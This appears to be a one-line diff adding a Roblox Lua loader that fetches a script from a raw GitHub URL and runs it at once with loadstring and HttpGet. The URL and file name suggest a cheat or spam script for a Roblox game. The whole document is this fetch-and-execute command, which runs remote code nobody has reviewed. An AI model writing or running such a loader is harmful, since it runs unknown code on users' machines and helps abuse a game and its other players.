@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/baddies-spam3-6tsry2z8jngjwx.lua"))()
